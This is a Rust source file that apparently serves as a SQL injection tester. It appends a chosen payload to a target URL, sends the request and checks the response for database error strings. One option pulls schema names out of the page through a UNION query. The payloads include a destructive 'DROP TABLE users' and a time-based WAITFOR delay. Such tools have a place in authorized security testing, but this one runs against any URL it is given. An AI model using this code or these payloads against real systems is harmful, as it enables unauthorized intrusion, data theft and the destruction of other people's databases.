use reqwest::Client;
use regex::Regex;
use scraper::{Html, Selector};

pub async fn validation_exist_sql_injection(
    url: &str,
    payload: &str) -> Result<String, reqwest::Error> {

    let client = Client::new();
    let set_payload = match payload {
        "1" => "' OR '1'='1",
        "2" => "'; DROP TABLE users; --",
        "3" => "'; WAITFOR DELAY '00:00:05'--",
        "4" => "' AND 1=1 --",
        "5" => "' AND 1=0 --",
        "6" => "' OR 1=0 --",
        "7" => "' OR 1=1 --",
        "8" => "-1 union select 1, 2, group_concat(schema_name) from information_schema.schemata",
        _ => return Ok("Option not found".to_string())
    };

    response(&client, url, set_payload, payload == "8").await
}

async fn response(
    client: &Client,
    url: &str,
    payload: &str,
    show_body: bool) -> Result<String, reqwest::Error> {

    let test_url = format!("{}{}", url, payload);

    let response = client.get(&test_url).send().await?;

    if response.status().is_success() {
        let body = response.text().await?;

        if !show_body {
            match contains_sql_injection(&body) {
                Ok(message) => Ok(message),
                Err(error) => Ok(error)
            }
        } else {
            match extract_information_schema(&body) {
                Ok(message) => Ok(message),
                Err(error) => Ok(error)
            }
        }
    } else {
        Err(response.error_for_status().unwrap_err())
    }
}

fn contains_sql_injection(body: &str) -> Result<String, String> {
    if body.contains("mysql_fetch_array()") || body.contains("SQL syntax") {
        Ok("✅ Vulnerable to SQL Injection".to_string())
    } else {
        Err("❌ No vulnerabilities found".to_string())
    }
}

fn extract_information_schema(html_content: &str) -> Result<String, String> {
    let document = Html::parse_document(html_content);
    let selector = Selector::parse("div, p").map_err(|_| "Failed \
    to parse selector".to_string())?;

    let css_regex = Regex::new(r"\{.*?\}").map_err(|_| "Failed to \
    compile regex".to_string())?;

    for element in document.select(&selector) {
        let text = element.text().collect::<Vec<_>>().join(" ");

        if text.contains("information_schema") && !css_regex.is_match(&text) {
            return Ok(text.trim().to_string());
        }
    }

    Err("Database not found".to_string())
}